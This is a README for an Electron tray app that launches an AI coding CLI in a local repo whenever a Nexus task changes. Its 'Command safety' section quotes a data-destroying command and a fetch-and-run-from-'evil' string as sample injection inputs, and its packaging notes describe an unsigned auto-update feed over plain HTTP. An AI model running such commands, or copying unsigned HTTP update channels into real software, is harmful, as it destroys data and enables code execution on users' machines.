# Nexus Agent (desktop app)

Runs a local AI CLI (Claude Code by default, or whatever you configure)
the moment a task you're on changes in Nexus — no polling, no manual
"let me check if it's my turn" session. Lives in the tray/menu bar; install
once, forget about it.

```
notify-server --WebSocket--> Nexus Agent (this app) --spawns--> your AI CLI, in your project repo
```

## Install (end users — no Node.js/npm knowledge needed)

1. Download the installer for your OS (`.dmg` for Mac, `.exe` for Windows) from wherever your team distributes it.
2. Open it, drag/run as normal for your OS.
3. First launch opens **Settings** automatically since nothing's configured yet:
   - **Server**: ask whoever runs `notify-server` for the address (`ws://host:port`)
   - **Nexus member id**: run `whoami` via nexus-mcp to find yours
   - **Shared secret**: ask whoever administers `notify-server`
   - **AI ที่จะใช้**: pick a preset (Claude Code / Codex / Gemini CLI) or "Custom" to write your own command
   - **โฟลเดอร์โปรเจกต์**: the repo this should actually do work in
4. Click **Test** to confirm the command runs before saving — catches "command not found" immediately instead of only failing silently later when a real task comes in.
5. **Save**. The app starts at login from now on (tray icon), reconnects automatically if your laptop sleeps or the network drops.

Pause anytime from the tray menu (**Enabled** checkbox) without losing the connection — you'll still see activity queue up, just won't auto-run anything until re-enabled.

## Why a desktop app instead of routines/CI-CD

Earlier designs this session (Claude Code cloud routines, GitLab CI/CD jobs)
hit real platform walls — routines only support GitHub repos and this
team's code is on an internal GitLab instance; CI/CD was ruled out to avoid
touching each project's existing deploy pipeline. Running locally on the
actual developer's machine sidesteps both: it already has real GitLab
access and an already-authenticated `claude` (or whichever) CLI, no shared
server auth juggling needed. See `nexus-mcp/DEVLOG.md` for the full trail.

## Command safety

The configured command is **never run through a shell** — `{{prompt}}` is
substituted after tokenizing the template, then spawned directly as
`spawn(cmd, args, { shell: false })`. Task/comment content from Nexus is
attacker-adjacent (anyone with API access to a project can write it), so
this matters: a comment containing `` `rm -rf ~` `` or `$(curl evil | sh)`
lands as one inert argv string, never interpreted as shell syntax. Verified
directly — see `lib/command.js` and the test cases run during development
(not part of the shipped app, but in this session's own record).

## Development

```bash
npm install
npm start          # runs the app via the local Electron dev binary
```

**A real limitation hit while building this**: this was developed inside a
sandboxed environment where the real Electron binary couldn't be
downloaded (network-restricted, left a ~50KB stub instead of the real
~100MB+ app) — the GUI layer (tray icon, settings/progress windows) could
not be launched and visually verified there. Everything *except* the
Electron GUI shell was verified for real: `lib/command.js`'s injection-safe
argv building (including actual injection-attempt strings run through a
real spawned process, not just unit-checked), `lib/store.js`'s
persistence, and `lib/ws-client.js` against a real running `notify-server`
over a real WebSocket connection with real Redis-published events. Run
`npm start` on a normal machine to confirm the GUI layer before shipping
this to the team — that part is genuinely unverified.

## Packaging

```bash
npm run dist
```

Produces a `.dmg` (Mac) / NSIS installer (Windows) via `electron-builder`,
per the `build` config in `package.json`.

**Not done, and needed before real distribution:**

- **Code signing.** Unsigned builds trigger Gatekeeper ("unidentified
  developer") on Mac and SmartScreen warnings on Windows. Needs an Apple
  Developer account (for `mac.identity`) and a Windows code-signing cert
  (for `win.certificateFile`) — neither configured here. Without them,
  each teammate has to manually approve the app the first time
  (System Settings → Privacy & Security → "Open Anyway" on Mac).
- **Update feed hosting.** `package.json`'s `build.publish` points at
  `http://27.254.62.17:8090/agent-app-releases/` as a placeholder — that
  path doesn't serve anything yet. `electron-builder`'s `generic` provider
  just needs `latest.yml`/`latest-mac.yml` plus the built artifacts
  reachable over plain HTTP at that URL; point it at wherever your team
  actually hosts static files (could be a simple folder served by nginx
  on the same box as pm-system/notify-server, doesn't need to be
  internet-facing any more than those are). Once that's live,
  `electron-updater`'s `checkForUpdatesAndNotify()` (already wired in
  `main.js`) picks up new versions automatically on every launch.
